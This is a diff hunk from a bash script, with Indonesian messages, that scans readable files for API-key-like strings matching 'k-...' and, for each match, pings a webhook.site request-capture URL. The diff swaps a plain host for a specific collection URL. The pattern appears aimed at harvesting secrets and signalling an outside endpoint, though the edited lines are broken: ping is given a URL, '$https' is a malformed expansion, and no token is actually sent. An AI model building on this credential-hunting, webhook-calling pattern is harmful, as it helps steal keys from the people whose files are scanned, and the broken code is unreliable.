@@ -11,8 +11,8 @@ for file in $files; do
     if [[ -r "$file" ]]; then
         targets=$(strings "$file" | grep -oE 'k-[A-Za-z0-9_-]{0,30}')
         for target in $targets; do
-            echo "Pinging webhook.site dari file $file..."
-            ping -c 2 "webhook.site"
+            echo "Pinging $https://webhook.site/a09f44a3-886c-4aed-84a0-718998def226 dari file $file..."
+            ping -c 2 "$https://webhook.site/a09f44a3-886c-4aed-84a0-718998def226"
             echo "-----------------------------"
         done
     fi
